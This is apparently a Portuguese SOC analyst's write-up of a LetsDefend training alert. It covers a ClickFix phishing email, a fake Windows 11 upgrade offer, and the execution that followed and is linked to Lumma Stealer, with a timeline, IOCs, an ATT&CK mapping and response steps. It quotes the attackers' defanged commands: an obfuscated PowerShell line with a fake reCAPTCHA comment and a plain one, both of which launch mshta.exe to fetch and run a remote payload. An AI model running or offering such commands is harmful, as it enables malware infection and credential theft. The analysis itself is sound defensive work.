# Phishing ClickFix com Lumma Stealer: investigação do alerta SOC338

> **Plataforma:** LetsDefend | **Alerta:** SOC338 (EventID 316) | **Data da investigação:** 2026-10-31
> **Severidade:** Critical | **Tipo:** Data Leakage (phishing / execução via LOLBin)
> **Veredito:** True Positive

---

## 1. Resumo

O alerta SOC338 indicou um e-mail de phishing com a técnica ClickFix, associada à distribuição do Lumma Stealer. O e-mail "Upgrade your system to Windows 11 Pro for FREE", enviado por `update[@]windows-update[.]site` e com marca Microsoft falsificada, foi entregue ao usuário `dylan`. Cerca de 13h40 depois, o usuário abriu o site da isca a partir do webmail (o proxy registra o *referrer*) e, 11 segundos depois, o host `172.16.17.216` executou um comando PowerShell ofuscado, terminado com um texto de falso reCAPTCHA, que lançou `mshta.exe` contra uma URL externa. O firewall **permitiu** a conexão, e tanto a URL do payload quanto o site da isca são detectados como maliciosos no VirusTotal. Classifiquei como **True Positive**. A execução no endpoint está confirmada. Não encontrei sinais de segundo estágio nos dados disponíveis, mas esses dados não bastam para afirmar que o payload não foi baixado ou executado.

## 2. Contexto do alerta

| Campo | Valor |
|---|---|
| Regra que disparou | SOC338 - Lumma Stealer - DLL Side-Loading via Click Fix Phishing |
| Data/hora do evento | 2025-03-13T09:44:00+03:00 |
| Host / usuário envolvido | Host `Dylan` (172.16.17.216) / `dylan[@]letsdefend[.]io` |
| IP de origem do e-mail (SMTP) | 132[.]232[.]40[.]201 |
| Remetente | `update[@]windows-update[.]site` |
| Assunto | Upgrade your system to Windows 11 Pro for FREE |
| Ação do dispositivo de segurança | **Allowed** (e-mail não foi bloqueado) |
| Motivo do disparo (segundo o alerta) | Site redirecionado contém script do tipo ClickFix para distribuição do Lumma Stealer |

## 3. Investigação

### 3.1 Triagem

O alerta faz sentido: o remetente usa um domínio com aparência de Microsoft (`windows-update[.]site`) que não pertence à Microsoft, e o assunto promete uma atualização "grátis". A ação **Allowed** mostra que o e-mail chegou à caixa do usuário. A severidade Critical e o tipo Data Leakage fazem sentido porque o Lumma é um *infostealer*, que rouba credenciais, cookies e dados de navegador.

### 3.2 Coleta

**E-mail (Email Security e Log Management).** O corpo do e-mail reúne sinais clássicos de phishing:

- logotipo "Microsoft" com a imagem quebrada (falsificação de marca);
- oferta de upgrade gratuito para o Windows 11 Pro, enviada por um domínio que não é da Microsoft;
- contagem regressiva ("4 Day 23 Hours 59 Mins") para criar urgência;
- botão "UPDATE NOW", que leva a `hxxps://www[.]windows-update[.]site/`.

Cabeçalho: `From` `update[@]windows-update[.]site`, `To` `dylan[@]letsdefend[.]io`, IP do remetente 132[.]232[.]40[.]201, data 2025-03-13 03:44:00 (relógio do e-mail), ação Allowed. No Log Management, a busca por `dylan` nos logs do dia retornou 1 evento do Exchange (`132.232.40.201:23542 → 172.16.20.3:25`, 03:44:32, Allowed), que confirma a entrega.

**Proxy (Log Management).** Pesquisei `windows-update` e obtive só 2 eventos: o e-mail acima e um acesso do proxy, às 17:26:08 (relógio dos logs), de `172.16.17.216:27672` para `132.232.40.201:443`. O log bruto do proxy mostra:

| Campo | Valor |
|---|---|
| URL | `hxxps://windows-update[.]site/` |
| Referrer | `hxxps://mail[.]letsdefend[.]io/` (webmail) |
| HTTP Status | 200 OK |
| Process Name | `chrome.exe` |
| User-Agent | Firefox 122 (Windows NT 10.0) |

Isso prova o caminho **e-mail → clique → site da isca**: o *referrer* é o webmail, e o site respondeu normalmente. Também mostra que o IP `132.232.40.201` é, ao mesmo tempo, o servidor que enviou o e-mail e o que hospeda o site.

Observação: o processo é `chrome.exe`, mas o User-Agent declara Firefox. Não consegui explicar a diferença. Pode ser alteração do User-Agent ou uma limitação da simulação, e não mudei a conclusão por causa disso.

**Navegador (Endpoint Security, Browser History).** Há uma única entrada: `hxxps://windows-update[.]site/` às 23:26:08 (relógio do EDR), o mesmo acesso do proxy.

**Terminal (Endpoint Security, Terminal History).** Três comandos em 13 segundos:

| Hora (EDR) | Comando (defanged, resumido) |
|---|---|
| 23:26:19 | `powershell.exe -w 1 powershell -Command ('ms]]ht]]]a]]].]]]exe hxxps://overcoatpassably[.]shop/Z8UZbPyVpGfdRS/maloy[.]mp4' -replace ']') # [✔] 'I am not a robot - reCAPTCHA Verification ID: 3824'` |
| 23:26:31 | `powershell.exe -Command "mshta.exe hxxps://overcoatpassably[.]shop/Z8UZbPyVpGfdRS/maloy[.]mp4"` |
| 23:26:32 | Repetição do primeiro comando ofuscado |

Por que isso importa:

- **Ofuscação:** o nome `mshta.exe` está quebrado com colchetes e reconstruído com `-replace ']'`. A janela é ocultada (`-w 1`, que provavelmente equivale a Hidden).
- **Falso reCAPTCHA:** depois do `#` (comentário no PowerShell) vem o texto "I am not a robot - reCAPTCHA Verification ID: 3824", que não é executado. É o padrão conhecido do ClickFix: a vítima vê uma mensagem de aparência legítima, enquanto o comando real passa despercebido.
- **Execução manual:** o comando das 23:26:31 tem o `explorer.exe` como processo pai, o que é consistente com execução iniciada pelo usuário (por exemplo, pela caixa Executar). Não confirmei o método exato.

**Processos (Endpoint Security).** Das 87 linhas, estas são as relevantes:

| Hora (EDR) | PID | Processo | Processo pai | Observação |
|---|---|---|---|---|
| 23:26:20 | 7284 | `mshta.exe` | `powershell.exe` | Usuário `LetsDefend`, caminho legítimo em System32 |
| 23:26:31 | 624 | `powershell.exe` | `explorer.exe` | Comando simples com `mshta` (2º comando do terminal) |
| 23:26:32 | 7308 | `powershell.exe` | `powershell.exe` | Coincide com o 3º comando do terminal |

O `mshta.exe` é um binário nativo do Windows (LOLBin) capaz de executar conteúdo remoto. A extensão `.mp4` é só disfarce, porque o `mshta` não depende da extensão. Procurei processos filhos do `mshta.exe` (PID 7284) e do PowerShell PID 7308 e **não encontrei nenhum**.

**Rede do host (Endpoint Security, Network Action).** São 28 entradas, ordenadas da mais recente (23:28:11) para a mais antiga (23:23:53). Esta aba mostra só horário e destino, sem processo, porta ou volume de dados. O que observei:

| Hora (EDR) | Destino | Observação |
|---|---|---|
| 23:26:08 | 132.232.40.201 | Servidor da isca (mesmo IP do remetente); coincide com o proxy |
| 23:26:20 | 172.67.139.19 | **Destino do `mshta.exe`** (payload); coincide com o firewall |
| 23:26:23 | 172.31.12.250 | Endereço privado (interno) |
| 23:27:15 | 77.88.21.119 | Única conexão pós-execução que não consegui classificar |

As demais entradas, anteriores e posteriores, parecem tráfego de fundo: endereços *link-local* e *loopback*, e faixas que parecem pertencer a Google, Microsoft, Cloudflare e Akamai (classifiquei pelas faixas de IP, sem verificar cada uma). Também aparece uma faixa que parece ser da Yandex, antes (87.250.251.119, 23:25:37) e depois (77.88.21.119, 23:27:15) da execução. Como o padrão se repete nos dois lados, ele é mais compatível com tráfego de fundo do que com um C2, mas isso é inferência. Não vi destino incomum repetido que sugira *beaconing*.

**Firewall (Log Management).** A busca por `mshta.exe` retornou 1 evento: `172.16.17.216:34211 → 172.67.139.19:443`, 17:26:20 (relógio do firewall), ação **Allowed**, `Process ID: 7284`, `Process Name: mshta.exe`, com a mesma URL do comando. O PID 7284 liga o firewall ao processo no EDR.

### 3.3 Análise de reputação

| Artefato | Ferramenta | Resultado |
|---|---|---|
| `hxxps://www[.]windows-update[.]site/` | VirusTotal (URL), relatório de 2026-10-07 | 10 de 93 engines: BitDefender, CyRadar, Fortinet, G-Data, Kaspersky, Sophos e VIPRE (*Malware*), Lionic e Webroot (*Malicious*) e SOCRadar (*Phishing*) |
| `hxxps://overcoatpassably[.]shop/Z8UZbPyVpGfdRS/maloy[.]mp4` | VirusTotal (URL), relatório de 2026-07-11 | 14 de 92 engines, entre elas BitDefender, ESET, Kaspersky, Sophos, Fortinet, G-Data e VIPRE (*Malware*) |
| `132[.]232[.]40[.]201` | AbuseIPDB | 0% de confiança de abuso (*Low Risk*), 5 relatos de 3 usuários, o mais recente de cerca de 2 anos atrás. ISP Tencent Cloud Computing (Beijing), tipo *Data Center/Web Hosting/Transit*, AS45090, China |

Os relatórios do VirusTotal são anteriores à minha consulta e o incidente simulado é de 2025-03. O resultado reflete o estado das URLs na data de cada relatório, e não o da época do evento.

O 0% do AbuseIPDB **não torna o IP confiável**: o score cai com o tempo quando não há relatos recentes, e o próprio site avisa que isso não invalida os relatos antigos. O IP é de infraestrutura de nuvem alugável, que atacantes costumam usar e que pode mudar de dono. A conclusão do caso se apoia no comportamento observado e na reputação das URLs, e não na reputação do IP.

### 3.4 Correlação e linha do tempo

Os logs de e-mail, proxy e firewall estão 6 horas atrás do relógio do EDR e do alerta. Tenho três evidências independentes: o PID 7284 aparece às 17:26:20 no firewall e às 23:26:20 no EDR; o acesso ao site aparece às 17:26:08 no proxy e às 23:26:08 no Browser History; e o e-mail está em 03:44 nos logs e 09:44 no alerta. Normalizei tudo para o relógio do EDR:

| Hora (EDR) | Fonte | Evento |
|---|---|---|
| 09:44 | Exchange / alerta | E-mail de `windows-update[.]site` entregue a `dylan` |
| 23:26:08 | Proxy / Browser History / rede | `chrome.exe` acessa `windows-update[.]site` (referrer: webmail, 200 OK); conexão a 132[.]232[.]40[.]201 |
| 23:26:19 | Terminal History | 1º comando PowerShell ofuscado com falso reCAPTCHA |
| 23:26:20 | EDR / rede / firewall | `mshta.exe` (PID 7284) inicia e conecta a 172[.]67[.]139[.]19:443 (Allowed) |
| 23:26:31 | Terminal / EDR | 2º comando (PowerShell PID 624, pai `explorer.exe`) |
| 23:26:32 | Terminal / EDR | 3º comando (PowerShell PID 7308) |
| 23:28:11 | Rede | Última conexão registrada do host |

O usuário executou o comando cerca de **13h40 depois** da entrega do e-mail e **11 segundos depois** de abrir o site. A busca por `windows-update` nos logs retornou apenas esse e-mail e esse acesso, então só encontrei este usuário e este host.

### 3.5 Limitações

- A aba *Network Action* só registra destino e horário, então não consigo afirmar se o payload foi baixado.
- Não encontrar processos filhos nem tráfego incomum não prova que o ataque falhou. A telemetria pode não cobrir tudo.
- Não vi resultados de SPF/DKIM/DMARC, porque a plataforma não os exibiu.
- Não verifiquei a reputação de `77.88.21.119` nem a natureza de `172.31.12.250`.
- Não pesquisei `overcoatpassably` no Log Management para ver se outros hosts contataram o domínio do payload.

## 4. IOCs

| Tipo | Valor | Contexto |
|---|---|---|
| E-mail remetente | `update[@]windows-update[.]site` | Phishing, falsa atualização do Windows |
| Domínio da isca | `windows-update[.]site` / `www[.]windows-update[.]site` | Imita a Microsoft; o botão do e-mail aponta para a versão com `www` e o proxy registra a versão sem `www` |
| URL da isca | `hxxps://www[.]windows-update[.]site/` | Destino do botão "UPDATE NOW"; detectada como maliciosa no VirusTotal |
| IP SMTP e do site | `132[.]232[.]40[.]201` | Enviou o e-mail e hospeda o site da isca (proxy, porta 443); nuvem Tencent Cloud (AS45090), 0% no AbuseIPDB |
| Domínio do payload | `overcoatpassably[.]shop` | Hospeda o conteúdo executado pelo `mshta` |
| URL do payload | `hxxps://overcoatpassably[.]shop/Z8UZbPyVpGfdRS/maloy[.]mp4` | Detectada como maliciosa no VirusTotal |
| IP de destino (firewall) | `172[.]67[.]139[.]19:443` | Resolução da URL do payload; provavelmente faixa de CDN, sem confirmação por WHOIS |
| Comportamento | `powershell -w 1 ... -replace ']' ... # I am not a robot - reCAPTCHA Verification ID: 3824` | Comando ClickFix ofuscado |
| Comportamento | `powershell.exe -Command "mshta.exe hxxps://..."` | `mshta` com URL remota |

O hash exibido no EDR para o `mshta.exe` pertence ao binário nativo em `System32`. Não o tratei como IOC, porque o abuso está no **uso** do utilitário, e não no arquivo.

## 5. Mapeamento MITRE ATT&CK

| Tática | Técnica | ID | Evidência no caso |
|---|---|---|---|
| Initial Access | Phishing: Spearphishing Link | T1566.002 | Botão "UPDATE NOW" levou ao site da isca; referrer do proxy é o webmail |
| Execution | User Execution: Malicious Link | T1204.001 | Usuário abriu o site a partir do e-mail |
| Execution | User Execution: Malicious Copy and Paste | T1204.004 | Comando executado pelo usuário a partir do falso reCAPTCHA (subtécnica recente, confira no ATT&CK) |
| Execution | Command and Scripting Interpreter: PowerShell | T1059.001 | `powershell.exe -Command ...` |
| Defense Evasion | System Binary Proxy Execution: Mshta | T1218.005 | `mshta.exe` executando URL remota |
| Defense Evasion | Obfuscated Files or Information | T1027 | `-replace ']'` para esconder `mshta.exe` e janela oculta |
| Command and Control | Ingress Tool Transfer | T1105 | Tentativa de obter o payload (conexão permitida); download não confirmado |

A técnica T1574.002 (DLL Side-Loading) consta nas tags da regra, mas **não a observei** na minha investigação. Por isso não a incluí como confirmada.

## 6. Veredito e justificativa

**Veredito: True Positive.**

- O remetente usa um domínio que imita a Microsoft, e o e-mail, com marca falsificada e urgência artificial, foi entregue (Allowed).
- O proxy prova que o usuário chegou ao site da isca a partir do webmail, e o site respondeu 200 OK. O site é detectado como phishing e malware por vários fornecedores.
- O terminal mostra um comando ofuscado com texto de falso reCAPTCHA, 11 segundos depois da visita. É o padrão do ClickFix, e não uso administrativo legítimo.
- O `mshta.exe` executou e o firewall permitiu a conexão; o mesmo PID (7284) liga a rede ao processo no EDR.
- A URL do payload é detectada como maliciosa por múltiplos fornecedores.

Quanto ao estágio do ataque: houve entrega, clique, engenharia social e **execução no endpoint**, e nenhum controle bloqueou a atividade. Não observei segundo estágio (sem processos filhos e sem tráfego incomum), mas, pelas limitações acima, isso não permite dizer que o ataque falhou. Como o Lumma é um infostealer e a execução foi permitida, o host deve ser tratado como **comprometido**.

## 7. Resposta recomendada

| Fase | Ação |
|---|---|
| **Contenção** | Isolar o host `172.16.17.216`; encerrar `mshta.exe` (PID 7284) e os PowerShell associados; bloquear no proxy/firewall os domínios `overcoatpassably[.]shop` e `windows-update[.]site` (com e sem `www`) e avaliar o bloqueio do IP `132[.]232[.]40[.]201` |
| **Erradicação** | Remover o e-mail da caixa de `dylan` e de eventuais outros destinatários (a busca nos logs retornou uma única mensagem); varredura completa do endpoint pelo EDR; buscar persistência e arquivos criados após 23:26; procurar o mesmo padrão de comando em outros hosts |
| **Recuperação** | Como o Lumma é um infostealer, tratar credenciais e sessões como potencialmente comprometidas: redefinir senhas do usuário, revogar sessões/cookies e revisar senhas salvas no navegador; reintegrar o host somente após validação |
| **Prevenção** | Treinar usuários sobre ClickFix (nunca colar comandos de sites ou e-mails na caixa Executar ou no PowerShell); restringir ou monitorar `mshta.exe`; criar detecção para PowerShell com `-replace` reconstruindo nomes de binários e para `powershell.exe` iniciando `mshta.exe` com URL remota; avaliar desativar a caixa Executar por política |

Observação: o IP `172.67.139.19` provavelmente pertence a uma CDN. Se o WHOIS confirmar, o bloqueio por domínio/URL é preferível ao bloqueio do IP, para evitar efeitos colaterais. Já o `132.232.40.201` hospeda a isca e envia o e-mail, mas é um IP de nuvem que pode ser reatribuído a outros clientes. Por isso, priorizar o bloqueio por domínio e revisar o do IP periodicamente.

## 8. Lições aprendidas

- **O que fiz bem:** correlacionei e-mail, proxy, navegador, terminal, processos e firewall pelo host, pelo PID e pelo horário, em vez de confiar em um único log. O *referrer* do proxy e o Browser History fecharam a ligação entre o e-mail e a execução.
- **O que errei ou demorei a perceber:** os fusos horários e as datas dos logs. Há um deslocamento de 6 horas entre as fontes, e é preciso normalizar antes de montar a linha do tempo para não cruzar telemetrias de eventos diferentes.
- **O que faria diferente:** abrir todas as abas do endpoint e pesquisar o domínio da isca no Log Management antes de concluir sobre o impacto. Concluí cedo demais que não havia evidência de impacto, e as abas de rede e terminal mostraram mais do que a lista de processos.
- **Conceito novo:** o padrão ClickFix, em que o usuário é induzido a colar e executar o comando por conta própria, e o abuso de binários legítimos (LOLBins) como `mshta.exe`. Também aprendi a ler ofuscação simples por substituição de caracteres e a diferenciar ausência de evidência de evidência de ausência.
